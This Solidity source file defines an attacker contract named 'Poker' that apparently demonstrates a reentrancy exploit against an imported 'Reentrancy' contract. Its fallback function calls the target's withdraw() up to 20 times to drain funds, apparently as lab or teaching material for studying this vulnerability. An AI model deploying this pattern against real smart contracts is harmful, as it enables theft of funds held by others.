pragma solidity ^0.4.23;
import "./Reentrancy.sol";

contract Poker {

    Reentrancy reentrancy;
    uint public count;

    event LogFallback(uint count, uint balance);

    constructor(address _target) public payable {
        reentrancy = Reentrancy(_target);
    }

    function pull() public {
        reentrancy.withdraw();
    }

    function() public payable {
        count ++;
        emit LogFallback(count, address(this).balance);
        if(count < 20) { reentrancy.withdraw(); }
    }

    function getBalance() public constant returns(uint) {
        return address(this).balance;
    }
}

